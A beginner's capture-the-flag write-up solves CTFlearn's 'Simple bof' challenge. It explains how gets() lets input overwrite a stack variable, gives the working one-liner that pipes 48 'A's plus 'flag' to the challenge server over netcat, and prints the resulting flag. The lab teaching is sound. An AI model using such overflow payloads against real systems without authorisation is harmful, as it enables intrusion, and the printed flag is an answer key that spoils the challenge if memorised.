# Simple bof
[Link to the challenge](https://ctflearn.com/challenge/1010)

My first ever buffer overflow!

## Step 1
We are given a C file which is the "original" code, just to get an idea of how the server is running.

Looking at the file I saw 2 interesting lines:
- `gets(buff); // This is a vulnerable call!`
- `if (secret == 0x67616c66) {`.

Apparently, `gets` is a vulnerable call.
After reading a little bit on it, I learned that `gets` will store, whatever is in the input, on the stack, which allows a BFO attack.

`secret` is the string I needed to attack to change it into `0x67616c66` (which equals to `galf`).

The stack is stored "backward", so I needed to input `flag` and not `galf`.

## Step 2
Connecting to the server using `netcat`, I got a nice visualization that helped me a lot to understand how `gets` really works.

After inputting `A` only the first byte where changed (to `41` because `A` equals `41`).

I saw there was:
- 4 lines of buffer
- 2 lines of padding
until I get to the secret.

So I needed (4+2)*8 A's + the `flag` string to do the BOF.

I could do it by hand but I imagined it was not 48 A's but like 2000 A's so I had to find a way to do it automatically or almost.

## Step 3
Python is a great tool for this kind of stuff.

I used `
```bash
$ python -c "print('A'*48+'flag')"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag
```

I just needed to pipe this output to the server (using `nc`) and I'd do the BOF attack.

```bash
$ python -c "print('A'*48+'flag')" | nc thekidofarcrania.com 35235

...

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xffc7c088 | 41 41 41 41 41 41 41 41 |
0xffc7c090 | 41 41 41 41 41 41 41 41 |
0xffc7c098 | 41 41 41 41 41 41 41 41 |
0xffc7c0a0 | 41 41 41 41 41 41 41 41 |
0xffc7c0a8 | 41 41 41 41 41 41 41 41 |
0xffc7c0b0 | 41 41 41 41 41 41 41 41 |
0xffc7c0b8 | 66 6c 61 67 00 ff ff ff |
0xffc7c0c0 | c0 65 fc f7 84 ef 5d 56 |
0xffc7c0c8 | d8 c0 c7 ff 11 cb 5d 56 |
0xffc7c0d0 | f0 c0 c7 ff 00 00 00 00 |

You did it! Congratuations!
CTFlearn{buffer_0verflows_4re_c00l!}
```
You can see all the 41s (which are the `A`) and the `66 6c 61 67` which is the data I needed to inject. 

I had the flag!

## Solution
The flag is `CTFlearn{buffer_0verflows_4re_c00l!}`